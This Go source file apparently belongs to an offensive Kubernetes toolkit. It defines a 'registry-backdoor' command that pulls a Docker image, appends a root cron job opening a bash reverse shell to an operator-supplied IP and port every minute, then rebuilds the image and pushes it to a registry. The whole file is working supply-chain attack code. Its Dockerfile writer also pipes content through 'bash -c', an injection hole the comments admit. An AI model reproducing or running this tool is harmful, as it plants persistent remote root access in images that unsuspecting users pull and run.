package out_cluster

import (
	"context"
	"fmt"
	"os/exec"
	"strings"

	"kubeshadow/pkg/errors"
	"kubeshadow/pkg/logger"

	"github.com/spf13/cobra"
)

var (
	// RegistryBackdoorCmd represents the command for the registry backdoor module
	RegistryBackdoorCmd = &cobra.Command{
		Use:   "registry-backdoor",
		Short: "Inject a backdoor into a Docker image and push it",
		Long:  `Pulls a Docker image, injects a simple reverse shell cronjob, builds a new image, and pushes it to a specified registry. REQUIRES Docker to be installed and running.`, // Added Long description
		RunE: func(cmd *cobra.Command, args []string) error {
			// Get flag values
			imageName, _ := cmd.Flags().GetString("image")
			newTag, _ := cmd.Flags().GetString("new-tag")
			ip, _ := cmd.Flags().GetString("ip")
			port, _ := cmd.Flags().GetString("port")

			// Basic validation (more comprehensive validation might be needed)
			if imageName == "" || newTag == "" || ip == "" || port == "" {
				return errors.New(errors.ErrValidation, "required flags --image, --new-tag, --ip, and --port are missing", nil)
			}

			// Execute the core logic
			return runRegistryBackdoorLogic(cmd.Context(), imageName, newTag, ip, port)
		},
	}
)

func init() {
	// Define flags for the command
	RegistryBackdoorCmd.Flags().String("image", "", "Source Docker image name (e.g., ubuntu:latest)")
	RegistryBackdoorCmd.Flags().String("new-tag", "", "New tag for the backdoored image (e.g., myregistry/ubuntu:backdoored)")
	RegistryBackdoorCmd.Flags().String("ip", "", "IP address for the reverse shell")
	RegistryBackdoorCmd.Flags().String("port", "", "Port for the reverse shell")

	// Mark flags as required
	RegistryBackdoorCmd.MarkFlagRequired("image")
	RegistryBackdoorCmd.MarkFlagRequired("new-tag")
	RegistryBackdoorCmd.MarkFlagRequired("ip")
	RegistryBackdoorCmd.MarkFlagRequired("port")
}

// runRegistryBackdoorLogic contains the core execution logic for the registry backdoor
func runRegistryBackdoorLogic(ctx context.Context, imageName, newTag, reverseShellIP, reverseShellPort string) error {
	logger.Info("Starting registry backdoor injection for image: %s", imageName)

	// Pull the image
	logger.Info("Pulling original image: %s", imageName)
	if err := exec.CommandContext(ctx, "docker", "pull", imageName).Run(); err != nil {
		return errors.New(errors.ErrRuntime, fmt.Sprintf("failed to pull image %s", imageName), err)
	}

	// Create Dockerfile that injects a reverse shell or persistence mechanism
	// NOTE: This cronjob reverse shell is a basic example and requires bash in the image.
	// More sophisticated backdoors might be needed depending on the target image.
	dockerfile := fmt.Sprintf(`
FROM %s
RUN echo "*/1 * * * * root bash -i >& /dev/tcp/%s/%s 0>&1" >> /etc/crontab
`, imageName, reverseShellIP, reverseShellPort)

	logger.Info("Writing temporary Dockerfile...")
	err := writeTempDockerfile(dockerfile)
	if err != nil {
		return errors.New(errors.ErrRuntime, "failed to write temporary Dockerfile", err)
	}

	// Build new image
	logger.Info("Building backdoored image as: %s", newTag)
	buildCmd := exec.CommandContext(ctx, "docker", "build", "-t", newTag, ".")
	buildCmd.Dir = "/tmp/kubeshadow_build" // Where Dockerfile was written
	// Capture stdout/stderr for debugging if needed, but suppress for clean output by default
	// buildCmd.Stdout = os.Stdout
	// buildCmd.Stderr = os.Stderr
	if err := buildCmd.Run(); err != nil {
		// Attempt to read build output if available (more advanced error handling)
		return errors.New(errors.ErrRuntime, fmt.Sprintf("docker build failed for %s", newTag), err)
	}

	// Push new image
	logger.Info("Pushing image: %s", newTag)
	if err := exec.CommandContext(ctx, "docker", "push", newTag).Run(); err != nil {
		return errors.New(errors.ErrRuntime, fmt.Sprintf("docker push failed for %s", newTag), err)
	}

	logger.Info("Successfully injected backdoor into %s and pushed as %s", imageName, newTag)

	// TODO: Implement cleanup logic (e.g., remove local image, temp dir)

	return nil
}

// writeTempDockerfile writes the Dockerfile content to a temporary directory
func writeTempDockerfile(content string) error {
	// Ensure the build directory exists
	cmd := exec.Command("mkdir", "-p", "/tmp/kubeshadow_build")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to create build directory: %w", err)
	}

	// Write Dockerfile content. Use -c with echo to handle multi-line content properly.
	// Be cautious with shell injection here - use proper escaping or alternative methods for complex content.
	// For this simple example, we replace newlines. More robust solutions might write directly.
	writeCmd := exec.Command("bash", "-c", fmt.Sprintf("echo -e \"%s\" > /tmp/kubeshadow_build/Dockerfile", strings.ReplaceAll(content, "\n", "\\n")))

	if err := writeCmd.Run(); err != nil {
		return fmt.Errorf("failed to write Dockerfile: %w", err)
	}

	return nil
}

// Note: The Module interface methods (Validate, Execute, Cleanup, etc.) defined in the previous step are no longer
// necessary if the command is registered directly via the global variable approach.
// We should remove the unused struct and interface implementation to keep the code clean.

// TODO: Remove unused RegistryBackdoorModule struct and its methods if they are no longer needed.
// Need to verify if any other part of the codebase relies on this module implementing types.Module.
// Based on current main.go and registry code, it seems unlikely, but worth a double check.
